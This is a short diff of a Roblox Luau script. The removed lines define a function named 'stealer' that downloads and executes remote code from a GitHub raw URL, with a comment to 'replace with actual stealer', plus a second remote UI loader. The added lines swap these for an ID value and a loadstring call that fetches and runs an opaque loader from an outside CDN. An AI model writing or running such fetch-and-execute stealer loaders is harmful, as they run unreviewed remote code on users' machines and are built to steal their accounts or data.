@@ -1,10 +1,2 @@
-local function stealer()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/panumas1311/fino_ui/refs/heads/main/kuysus"))() -- replace with actual stealer
-end
-local function loadui()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/panumas1311/mekkubb/refs/heads/main/mekee"))()
-
-end
-
-task.spawn(stealer)
-task.spawn(loadui)
+ID="b4f0a009-d8b0-4eed-a249-662f4ea817b9";
+loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
